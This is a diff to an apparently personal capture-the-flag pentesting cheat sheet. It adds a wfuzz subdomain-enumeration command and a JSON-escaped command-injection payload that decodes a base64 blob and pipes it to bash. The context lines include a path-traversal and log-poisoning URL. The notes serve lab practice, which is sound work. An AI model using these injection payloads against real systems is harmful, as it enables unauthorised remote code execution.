@@ -10,6 +10,7 @@ feroxbuster -u http://$IP/ -w /usr/share/seclists/Discovery/Web-Content/common.t
 ```
 wfuzz -c -w /usr/share/dirb/wordlists/subdomains-top1million-5000.txt -u "http://team.thm" -H "Host: FUZZ.team.thm" --hw 977 
 gobuster vhost -u http://holo.live -w /usr/share/seclists/Discovery/DNS/subdomains.txt -t 30
+wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://cmess.thm" -H "Host: FUZZ.cmess.thm"
 ```
 #### Discover files with `wfuzz` :
 ```
@@ -41,3 +42,8 @@ http://10.10.62.183/?view=dog/../../../../var/log/apache2/access.log&ext&cmd='co
 ```
 
 #### cadaver for WebDAV
+
+#### payload in json format
+```
+"\";echo <base64 payload> | base64 -d | bash;\""
+```
